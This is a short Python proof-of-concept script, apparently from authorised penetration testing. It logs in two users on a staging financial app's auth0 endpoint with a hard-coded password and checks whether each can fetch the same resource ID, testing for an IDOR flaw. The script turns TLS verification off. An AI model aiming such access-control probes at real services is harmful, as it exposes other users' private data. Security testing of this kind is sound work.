#!/usr/bin/env python3
"""
    @Author: Daniel Ortiz
    @Date: 2/12/2020
    @Description: this script was using during an IDOR PoC. Takes two user and check if userA has access
    to the same resourceID of userB

"""
import requests, sys
from urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
proxies  =  {"http": "127.0.0.1:8080" , "https": "127.0.0.1:8080"}


def get_token(username, password):
    # testing in stage 
    data_stage ={"audience": "https://login.nxapp.naranjax.com", \
            "client_id": "client-id", "grant_type": "http://auth0-endpoint",\
            "password": password, "realm": "CustomersNX-DB", "scope": "write:financial-bff write:accounts.status write:customers.cards write:notifications.email write:notifications.push openid profile email offline_access",\
            "username": username}
    stage_endpoint = "https://auth0-endpoint"    
    token = make_request(stage_endpoint, data_stage)
    return token


def test_idor(token):
    target = "https://target-url"
    headers = {"Authorization": "Bearer " + token, \
    "X-App-Platform": "android", "X-App-Version": "3.11.0.2618", "Connection": "close", "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/4.2.1"}
    r =  requests.get(target, headers=headers, proxies=proxies, verify=False)
    print(r.text)


def make_request(target, data):
    headers = {"Accept-Language": "en_US",\
        "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", \
        "User-Agent": "okhttp/2.7.5"}
    r = requests.post(target, headers=headers, json=data)
    json_data = r.json()
    return json_data['access_token']


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Invalid parameter len")
        sys.exit(1)
    user_1 = sys.argv[1]
    user_2 = sys.argv[2]
    password = "111112"
    # testing 1
    print("(+) Begin testing 1 ....")
    print("(+) Testing with user: " +  user_1)
    token = get_token(user_1, password)
    print("(+) Token received: " + token)
    print("(+) Testing IDOR with resource 2845 ")
    test_idor(token)
    # testing 2
    print("(+) Begin testing 2 ....")
    print("(+) Testing with user: " +  user_2)
    token = get_token(user_2, password)
    print("(+) Token received: " + token)
    print("(+) Testing IDOR with resource 2845 ")
    test_idor(token)
